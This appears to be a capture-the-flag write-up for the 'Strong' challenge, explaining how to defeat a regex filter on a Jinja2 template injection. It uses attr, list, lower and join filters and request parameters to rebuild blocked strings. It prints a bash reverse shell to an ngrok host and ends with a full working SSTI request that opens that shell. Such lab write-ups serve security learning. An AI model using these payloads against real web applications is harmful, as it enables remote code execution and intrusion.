<hr />

<h2>description: Jinja2 SSTI filter bypass</h2>

<h1>Strong</h1>

<blockquote>
  <p>This type of challenges is created to be solved at the end, but you know it's a matter of time so who is the faster?</p>
  
  <p>Link: http://128.199.3.34:1234</p>
  
  <p><strong>Author:</strong> Kahla</p>
</blockquote>

<p>This was a Jinja2 template injection challenge, with the following filter:</p>

<p><code>python
re.search("\{\{|\}\}|(popen)|(os)|(subprocess)|(application)|(getitem)|(flag.txt)|\.|_|\[|\]|\"|(class)|(subclasses)|(mro)|\\\\",request.form['name'])
</code></p>

<p>As we can see, the filter is quite extensive!</p>

<p><img src="../../.gitbook/assets/Screenshot 2022-05-13 at 6.06.52 PM.png" alt="" /></p>

<h3>Bypassing "{{" and "}}"</h3>

<p>This one is rather straightforward. We could still get code execution through an if-else statement:</p>

<p><code>django
{% raw %}
{% if PAYLOAD %}{% endif %}
{% endraw %}
</code></p>

<h3>Bypassing ".", "[", "]"</h3>

<p>We could bypass the use of <code>.</code> by using the <code>attr</code> filter. For instance, <code>request|attr('args')</code> is the same as <code>request.args</code>.</p>

<p>Sometimes, we need to access elements of a list or dictionary. This was a bit more tricky but looking into the <a href="https://jinja.palletsprojects.com/en/3.1.x/templates/#builtin-filters">Built-in Filters</a> part of the documentation, we can find some useful information.</p>

<p>To get the first and last items of a list, we could use <code>|first</code> and <code>|last</code> respectively.</p>

<p>If we need to access items in a dictionary, we could first convert them to a list using <code>|list</code>, then access the first and last elements.</p>

<h3>Bypassing "_", "\", "class", "subclasses", "getitem"</h3>

<p>In order for our RCE payload to work, I needed access to <code>__class__</code>, <code>__subclassess__</code> and <code>__getitem__</code>.</p>

<p>We needed a way to construct something like <code>()|attr('__class__')</code>. The <code>\</code> character was banned, so using octal or hexadecimal numbers to construct the string was not possible.</p>

<p>One easy way to get banned characters into a string was to use <code>request.args</code> - this is a MultiDict object containing the GET request parameters.</p>

<p>For example, this allowed us to get the <code>__</code> string:</p>

<p>```http
POST /?__=a</p>

<p>...</p>

<p>name=... request|attr('args')|list|first ...
```</p>

<p>Bypassing the <code>class</code>, <code>subclasses</code>, and <code>getitem</code> strings could be done by using the <code>|lower</code> filter. For instance: <code>'CLASS'|lower</code>.</p>

<p>All that's left to do is to join the <code>class</code> string with the preceding and ending <code>__</code> characters. This can be achieved using <code>|join</code>.</p>

<p>Viola, the following will give us <code>().__class__</code>:</p>

<p><code>()|attr((request|attr('args')|list|first,'CLASS'|lower,request|attr('args')|list|first)|join)</code></p>

<p>This can then be extended to construct almost any arbitrary payload.</p>

<h3>Gaining RCE</h3>

<p>To get RCE, a typical method is through <code>().__class__.__subclasses__.__getitem__(x)</code> where <code>x</code> corresponds to the index of the <code>subprocess.Popen</code> class.</p>

<p>We do not know the value of <code>x</code> in this case, but we can still blindly bruteforce the value of <code>x</code> by submitting our RCE payload with different <code>x</code> values until we receive a shell.</p>

<p>In order to complete our RCE payload, I needed the <code>.</code> character for my callback domain, and the <code>"</code> character for the bash command:</p>

<p><code>bash -c "bash -i &gt;&amp; /dev/tcp/8.tcp.ngrok.io/14003 0&gt;&amp;1"</code></p>

<p>These characters can be obtained in a similar fashion as <code>__</code>. Adding a second GET request parameter, we can access <code>.</code> through <code>request|attr('args')|list|last</code>.</p>

<p>As for <code>"</code>, we could add another POST request parameter and access it through <code>request|attr('form')|list|last)|join</code>.</p>

<h3>Final Payload</h3>

<p>It might not have been the most elegant, but it got the job done!</p>

<p>```http
POST /?__=a&amp;.=b HTTP/1.1
Host: 128.199.3.34:1234
Content-Length: 661</p>

<p>name={% raw %}
{% if ()|attr((request|attr('args')|list|first,'CLASS'|lower,request|attr('args')|list|first)|join)|attr((request|attr('args')|list|first,'base',request|attr('args')|list|first)|join)|attr((request|attr('args')|list|first,'SUBCLASSES'|lower,request|attr('args')|list|first)|join)()|attr((request|attr('args')|list|first,'GETITEM'|lower,request|attr('args')|list|first)|join)(276)(('bash -c ',request|attr('form')|list|last,'bash -i &gt;%26 /dev/tcp/8',request|attr('args')|list|last,'tcp',request|attr('args')|list|last,'ngrok',request|attr('args')|list|last,'io/14003 0>%261',request|attr('form')|list|last)|join,shell=True,stdout=-1) %}{% endif %}
{% endraw %}&amp;"
```</p>
